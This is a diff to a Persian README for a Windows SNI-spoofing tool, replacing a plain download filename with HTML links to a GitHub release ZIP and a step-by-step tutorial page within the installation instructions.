@@ -50,10 +50,10 @@
 مراحل اجرا:
 
 1. فایل زیر را از بخش GitHub Releases دانلود کنید:
-
-```text
+<a href="https://floxu1.github.io/UAC-SNI-Spoofer-Windows](https://github.com/Floxu1/UAC-SNI-Spoofer-Windows/releases/download/1.0.0/UAC-Spoofer-Desktop-v1.0.0-Windows-x64.zip" target="_blank">
 UAC-Spoofer-Desktop-Windows-x64.zip
-```
+</a>
+
 
 2. فایل ZIP را کامل Extract کنید.
 3. پوشه `_internal` باید کنار فایل اجرایی باقی بماند.
@@ -62,9 +62,14 @@ UAC-Spoofer-Desktop-Windows-x64.zip
 ```text
 UAC-Spoofer-Desktop.exe
 ```
+<a href="https://floxu1.github.io/UAC-SNI-Spoofer-Windows/" 
+style="display:inline-block;padding:10px 20px;background:#24292f;color:white;text-decoration:none;border-radius:8px;"
+target="_blank">
+آموزش ساده و قدم به قدم راه اندازی و استفاده از نرم‌افزار UAC Sni spoofing نسخه ویندوز
+</a>
 
 5. در صورت نمایش پیام UAC ویندوز، آن را تأیید کنید.
-
+ا
 برای اجرای نسخه Portable نیازی به نصب Python نیست.
 
 ## اجرای نسخه سورس
